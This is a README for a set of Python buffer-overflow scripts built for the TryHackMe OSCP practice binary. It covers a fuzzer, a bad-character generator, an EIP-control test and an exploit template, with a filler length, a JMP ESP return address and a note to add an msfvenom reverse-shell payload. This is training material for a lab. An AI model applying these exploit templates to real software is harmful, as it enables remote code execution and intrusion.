# BufferOverflow
Buffer Overflow Python Scripts

Don't forget to change the IP address of the oscp.exe server

```python
s.connect(("192.168.100.2", 1337)) 
```

## Bad Character Generator for Python3

Just a badcharacter generator to copy and paste into your buffer overflow python script

## Fuzzer

Python3 Fuzzer to enable a buffer overflow

## BoF Template for OSCP.exe from TryHackMe

Simple BoF templatae for oscp.exe.

Don't forget to update the payload_shell with your own msfvenom generated reverse shell payload

Update the header for each overflow example... ie. OVERFLOW1 ,OVERFLOW2 , etc

```python
header = "OVERFLOW1 "
```

Adjust the filler buffer to enable the overflow, adjust the eip address (JMP ESP)

Change the payload reference for the extend to caclulate the correct end of the buffer after your payload (this is not necessary, however it keeps the original BoF intact)

```python
filler = "A" * 1978  # Filler 1978 Bytes + 10 Bytes Header
eip = "\xaf\x11\x50\x62"    #0x625011af  Return Address JMP ESP
extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))
```

## Eip Test

Verification of Control of EIP register

Adjust the filler to enable the overflow and the correct header for the specific overflow program

```python
header = "OVERFLOW1 "
filler = "A" * 1978
```
